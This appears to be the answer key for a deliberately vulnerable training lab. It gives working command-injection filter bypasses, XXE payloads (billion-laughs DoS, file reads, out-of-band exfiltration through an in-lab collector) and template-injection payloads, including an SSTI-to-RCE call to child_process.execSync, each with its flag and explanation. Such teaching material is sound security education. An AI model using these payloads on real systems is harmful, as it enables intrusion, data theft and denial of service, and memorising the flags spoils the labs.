# Batch 05 Solutions - cmdi, xxe, ssti deepening (22 labs)

All URLs assume the lab runs at `http://127.0.0.1:3105` (replace with your port).
For GET payloads containing special characters, either paste them into the page's
form (the browser encodes them) or URL-encode them for curl. For POST payloads
containing `&`, use `curl --data-urlencode`.

## cmdi - Command Injection

**1. Ping Gadget v3 (spaces stripped)** - `PENTRIX{cmdi_cmdi-ifs}`

Request:

```
GET /cmdi/ping3?host=127.0.0.1;cat$IFS/etc/passwd
```

The filter deletes every space, so `cat /etc/passwd` becomes `cat/etc/passwd` and
breaks. `$IFS` is the shell's Internal Field Separator variable: unquoted, it expands
to whitespace, giving the shell `cat /etc/passwd` again. The output shows `root:` and
the flag is awarded.

Why it works: the blacklist removes spaces but the shell still expands `$IFS` into a
word separator at run time.

**2. Ping Gadget v4 ($IFS blocked too)** - `PENTRIX{cmdi_cmdi-braces}`

Request (note: `{` and `}` must be URL-encoded as `%7B`/`%7D`, `$` as `%24`):

```
GET /cmdi/ping4?host=127.0.0.1;cat%24%7BIFS%7D/etc/passwd
```

The filter now also strips the literal string `$IFS`. The braced form `${IFS}` refers
to the same variable but does not match the naive string filter, so the shell still
sees `cat /etc/passwd`.

Why it works: string-matching filters do not understand shell syntax, and `${IFS}`
expands exactly like `$IFS`.

**3. Ping Gadget v5 (separators blocked)** - `PENTRIX{cmdi_cmdi-newline}`

Request (`%0a` is a URL-encoded newline):

```
GET /cmdi/ping5?host=127.0.0.1%0acat%20/etc/passwd
```

The filter strips `;`, `&` and `|`, but a newline also terminates a shell command.
The shell receives two lines - `ping -c 1 127.0.0.1` and `cat /etc/passwd` - and runs
both. The output shows `root:` and the flag is awarded.

Why it works: the blacklist forgot that newline is a command separator, and the
value is placed into the command unquoted.

**4. Ping Gadget v6 ($() blocked)** - `PENTRIX{cmdi_cmdi-backtick}`

Request:

```
GET /cmdi/ping6?host=127.0.0.1;echo%20`id`
```

The filter removes `$(`, killing modern `$(...)` substitution. Backticks are the
legacy command-substitution syntax and are untouched, so `` `id` `` runs and its
output (`uid=...`) is echoed.

Why it works: the filter blocks one command-substitution syntax but the shell honors
two.

**5. Ping Gadget v7 (cat and / blocked)** - `PENTRIX{cmdi_cmdi-wildcard}`

Request (`?` encoded as `%3F`, space as `%20`):

```
GET /cmdi/ping7?host=127.0.0.1;/%3F%3F%3F/bin/%3Fat%20/%3F%3F%3F/p%3Fsswd
```

The filter strips the word `cat` and standalone `/` tokens. `?` is a glob wildcard
matching any single character, so the shell expands `/???/bin/?at` to `/bin/cat` and
`/???/p?sswd` to `/etc/passwd` (and `/bin/passwd`) at run time. Neither blocked word
is ever typed. The output contains `root:` and the flag is awarded.

Why it works: the blacklist matches literal words, but glob wildcards let the shell
itself rebuild the blocked words during pathname expansion.

**6. Ping Gadget v8 (; blocked)** - `PENTRIX{cmdi_cmdi-pipe}`

Request:

```
GET /cmdi/ping8?host=127.0.0.1|id
```

Only `;` is stripped. The pipe `|` chains commands without it: `ping -c 1 127.0.0.1`
runs, its output is piped into `id`, and `id` prints `uid=...`.

Why it works: `|` is a command separator the single-character blacklist never
considered.

**7. Ping Gadget v9 (spaces blocked, again)** - `PENTRIX{cmdi_cmdi-tab}`

Request (`%09` is a URL-encoded tab):

```
GET /cmdi/ping9?host=127.0.0.1;cat%09/etc/passwd
```

Spaces are stripped, but a literal tab is also shell whitespace. The shell sees
`cat<TAB>/etc/passwd`, runs it, and the output shows `root:`.

Why it works: the filter blocks one whitespace character while the shell accepts
several (space, tab, newline).

**8. Ping Gadget v10 (metachars blocked, unquoted)** - `PENTRIX{cmdi_cmdi-env}`

Request (`%0a` is a URL-encoded newline):

```
GET /cmdi/ping10?host=127.0.0.1%0aid
```

The blacklist strips `;`, `|`, `&`, `$` and backticks, but the value is dropped into
the command line with no quotes. A newline starts a second command, so the shell runs
`ping -c 1 127.0.0.1` and then `id`. The output shows `uid=...` and the flag is
awarded.

Why it works: no blacklist can be complete, and an unquoted newline is a command
separator this one missed.

## xxe - XXE Injection

**1. Billion Laughs (Entity-Expansion DoS)** - `PENTRIX{xxe_xxe-billion-laughs}`

Request (use `--data-urlencode` so the `&` characters survive):

```
POST /xxe/billion
xml=<!DOCTYPE lolz [<!ENTITY lol "xxxxxxxxxx"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> ... up to lol7 ... ]><data>&lol7;</data>
```

Each level references the previous one ten times, so expansion multiplies the work by
ten per level. The endpoint expands internal entities recursively with no depth
limit: the 7-level payload (515 bytes in) expands to ~16 MB and keeps the parser
busy for seconds. The flag is awarded when parse time exceeds 1.5 s (or expansion
passes 5 MB, which de-flakes fast hardware). Verified: 16,111,259 chars expanded,
~2.6 s parse time.

Why it works: recursive entity expansion is exponential, and nothing caps the
recursion depth or total output.

**2. External DTD Exfiltration** - `PENTRIX{xxe_xxe-external-dtd}`

Step 1 - host the malicious DTD on the in-lab collector:

```
POST /xxe/collector/dtd
dtd=<!ENTITY % file SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">
<!ENTITY pingback SYSTEM "http://127.0.0.1:3105/xxe/collector/log?d=%file;">
```

Step 2 - import XML that pulls in the hosted DTD:

```
POST /xxe/dtd
xml=<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://127.0.0.1:3105/xxe/collector/dtd"> %dtd;]><data>&pingback;</data>
```

The endpoint fetches the DTD, expands `%file;` inside it (reading `secret.txt` into
the pingback URL), then resolves the `pingback` entity, which makes the server
request `/xxe/collector/log?d=XXE-SECRET-4471`. The exfiltrated secret lands in the
collector log, and the flag is awarded. (The collector page shows a ready-to-paste
DTD template with the correct absolute path and port.)

Why it works: external DTDs are fetched and their parameter entities are honored, so
a DTD can turn a file read into a server-side request carrying the file content.

**3. XXE in Uploaded SVG** - `PENTRIX{xxe_xxe-svg}`

Request:

```
POST /xxe/svg
svg=<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

The SVG text extractor runs the module's entity-expanding parser before pulling out
`<text>` elements. An SVG is just XML, so the DOCTYPE rides along, the `file://`
entity is resolved, and the secret appears in the extracted text.

Why it works: the "parser" expands external entities on any XML it is handed,
including uploaded SVGs.

**4. XInclude File Inclusion** - `PENTRIX{xxe_xxe-xinclude}`

Request:

```
POST /xxe/xinclude
xml=<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt" parse="text"/></root>
```

The endpoint honors `<xi:include>` tags and resolves the `href` server-side with the
same `file://`/`http://` support as entities. The file content is spliced into the
document and shown in the output.

Why it works: `xi:include` hrefs are fetched server-side with no allowlist, which is
XXE by another name.

**5. Parameter-Entity OOB Exfiltration** - `PENTRIX{xxe_xxe-param-oob}`

Request (single quotes around the inner URL are required):

```
POST /xxe/param
xml=<!DOCTYPE r [
<!ENTITY % file SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://127.0.0.1:3105/xxe/collector/log?d=%file;'>">
%oob;
]>
<data>&exfil;</data>
```

Everything happens inline: `%file;` reads the secret, `%oob;` smuggles a brand-new
`<!ENTITY>` declaration into the doctype at parse time (the outer value is
double-quoted, so the inner declaration uses single quotes), and `&exfil;` makes the
server request the collector URL with the secret in it. Two pingbacks land in the
collector log carrying `XXE-SECRET-4471`, and the flag is awarded.

Why it works: parameter entities are expanded inside the doctype, so an attacker can
declare new external entities at parse time and pivot a file read into an
out-of-band request.

**6. XXE in SOAP Endpoint** - `PENTRIX{xxe_xxe-soap}`

Request:

```
POST /xxe/soap
xml=<?xml version="1.0"?><!DOCTYPE env [<!ENTITY xxe SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetStatus>&xxe;</GetStatus></soap:Body></soap:Envelope>
```

A second XML endpoint expecting a SOAP envelope runs the same naive entity-expanding
parser before reading the Body. The DOCTYPE declares a `file://` entity, `&xxe;` is
referenced inside `<soap:Body>`, and the secret appears in the service response.

Why it works: every XML entry point shares the vulnerable parser, so the classic
`file://` entity works on the SOAP endpoint too.

## ssti - Server-Side Template Injection

All eight gadgets use the same homemade engine as `/ssti/greet` (`eval()` inside
`{{ }}`), each with a different naive input blacklist. For GET requests, URL-encode
the payload or use `curl --get --data-urlencode`.

**1. Template Injection on a Second Endpoint** - `PENTRIX{ssti_ssti-echo2}`

Request:

```
GET /ssti/card?msg={{7*7}}
```

A second endpoint runs the identical naive engine with no filter. `{{7*7}}` evaluates
to 49 in the invitation card.

Why it works: the template engine evaluates anything inside `{{ }}` as server-side
code.

**2. Word Blacklist Bypass** - `PENTRIX{ssti_ssti-wordfilter}`

Request:

```
GET /ssti/wordfilter?input={{eval("vaultSec"+"ret")}}
```

The filter deletes the words `flag`, `secret` and `config`, so `{{vaultSecret}}`
becomes `{{vault}}` and fails. Splitting the blocked word across a string
concatenation (`"vaultSec"+"ret"`) means the literal word never appears in the input;
the nested `eval()` reassembles it at run time and reads the in-scope variable.

Why it works: the blacklist is plain substring matching, and string concatenation
plus a nested `eval()` rebuilds the blocked identifier after filtering.

**3. Underscore Blacklist Bypass** - `PENTRIX{ssti_ssti-nounderscore}`

Request:

```
GET /ssti/nounderscore?input={{eval("db"+String.fromCharCode(95)+"pass")}}
```

Underscores are deleted, so `{{db_pass}}` becomes `{{dbpass}}`. Character code 95 is
`_`, so `String.fromCharCode(95)` rebuilds the underscore at run time and the nested
`eval()` resolves `db_pass`.

Why it works: the filter removes a character the attacker can regenerate from its
character code.

**4. Bracket Blacklist Bypass** - `PENTRIX{ssti_ssti-nobrackets}`

Request:

```
GET /ssti/nobrackets?input={{JSON.stringify(cfg)}}
```

Brackets are deleted and the flag lives in `cfg["db-pass"]`, whose key contains a
dash, so dot notation cannot reach it either. Instead of indexing the object,
`JSON.stringify(cfg)` serializes the whole object to text, revealing the flag with
no brackets at all.

Why it works: when indexing is impossible, serializing the entire object leaks every
property.

**5. Dot Blacklist Bypass** - `PENTRIX{ssti_ssti-dotblock}`

Request:

```
GET /ssti/dotblock?input={{db["key"]}}
```

Dots are deleted, so `{{db.key}}` becomes `{{dbkey}}` and fails. JavaScript's
bracket notation (`db["key"]`) accesses the same property with no dots.

Why it works: property access has two syntaxes, and the filter only blocks one.

**6. Curly-Brace Strip Bypass** - `PENTRIX{ssti_ssti-curly}`

Request:

```
GET /ssti/curly?input={{{{7*7}}}}
```

The filter removes the first `{{` and the first `}}` only, once each (like the naive
semicolon filter in the cmdi module). Sending doubled braces leaves one working
`{{7*7}}` behind after stripping, which evaluates to 49.

Why it works: a strip-once filter is defeated by doubling the stripped sequence.

**7. Quote Blacklist Bypass** - `PENTRIX{ssti_ssti-noquotes}`

Request:

```
GET /ssti/noquotes?input={{eval(String.fromCharCode(118,97,117,108,116,75,101,121))}}
```

Quotes are deleted and the variable name `vaultKey` is blocked as a word, so no
string literal and no direct reference is possible. The character codes spell
`vaultKey` (118=v, 97=a, 117=u, 108=l, 116=t, 75=K, 101=e, 121=y) with no quotes and
no blocked word; the nested `eval()` turns it back into the identifier.

Why it works: any string can be rebuilt from character codes, and a nested `eval()`
evaluates the rebuilt identifier in the template scope.

**8. SSTI to Remote Code Execution** - `PENTRIX{ssti_ssti-rce}`

Request:

```
GET /ssti/exec?expr={{require("child_process").execSync("id").toString()}}
```

There is no sandbox: template expressions run in Node.js with `require()` in scope.
Reaching `child_process` turns the injection into OS command execution, and the
`uid=...` output of `id` is rendered into the page.

Why it works: the template engine is raw `eval()` in a Node.js process, so SSTI
escalates directly to RCE via `require("child_process")`.
